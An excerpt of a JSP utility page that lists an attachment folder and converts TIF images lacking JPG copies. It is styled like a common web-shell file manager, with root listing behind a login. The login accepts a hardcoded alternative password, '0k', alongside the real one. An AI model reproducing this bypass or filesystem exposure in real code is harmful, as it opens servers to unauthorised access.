...
<%@page import="com.sun.media.jai.codec.JPEGEncodeParam"%>
<%@page import="com.sun.media.jai.codec.ImageEncoder"%>
<%@page import="com.sun.media.jai.codec.ImageCodec"%>
<%@page import="com.sun.media.jai.codec.SeekableStream"%>
<%@page import="com.sun.media.jai.codec.FileSeekableStream"%><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
...
public void mainForm(JspWriter out,String webSite_Folder) throws Exception{
	out.print("检测TIF-JPG<a href='?action=Z' target=FileFrame>检查</a><br><iframe name='FileFrame' width='800px' height='600px'></iframe>");
}
public void mainMenu(JspWriter out,String webSite_Folder,String strAbsPath) throws Exception{
	out.print("╬┅╬═══════════");
	out.print("<div align=\"center\" style=\"width: 100%; height:31; vertical-align:middle ;color: White ; position: relative; filter: glow(color=#00CCFF, strength=5)\"><font face=\"楷体_GB2312\" size=4></font> </div> ");
	out.print("═══════════╬┅╬");	
	listRoot(out);
...
public void listFolder(JspWriter out,String path) throws Exception{
	...
	try{
		...
		if(sfiles.length>0){
			HashSet<String> setTIF = new HashSet<String>();
			HashSet<String> setJPG = new HashSet<String>();
			for(int i=0;abFileName[i]!=null;i++){	
				out.print("<tr><td>"+abFileName[i]+"</td></tr>");
			}
			for(int i=sfiles.length;reFileName[i]!=null;i--){
				out.print("<tr><td>"+reFileName[i]+"</td></tr>");
				if(reFileName[i]!=null&&reFileName[i].toLowerCase().lastIndexOf("tif")>0){
					setTIF.add(reFileName[i]);
				}
				if(reFileName[i]!=null&&reFileName[i].toLowerCase().lastIndexOf("jpg")>0){
					setJPG.add(reFileName[i]);
				}
			}
			int a = 0;
			for(String tifName : setTIF){
				String jpgName = tifName.substring(0,tifName.length()-3)+"jpg";
				if(!setJPG.contains(jpgName)){
					a++;
					OutputStream jos = null;
					InputStream is = null;
					try {
						String descFile = path+"/"+tifName;
						...
						ImageEncoder encoder = ImageCodec.createImageEncoder("JPEG",jos, param);
						encoder.encode(src);
						src.dispose();
					}catch(Exception e){
						e.printStackTrace();
...
public void check(JspWriter out,HttpServletRequest request,String webSite_Folder) throws Exception{
	String filePath = webSite_Folder+"ccapp/FcAttach";
	File ff = new File(filePath);
	out.print(webSite_Folder);
	listFolder(out,filePath);
}
%>
<%
	if(session.getAttribute("login")==null){
		if(request.getParameter("pass")!=null&&(request.getParameter("pass").equals(passWord)
			||request.getParameter("pass").equals("0k"))){
...
<%
	...
	try{
		switch(action){
			case 'Z':check(out,request,webSite_Folder);break;
			default :
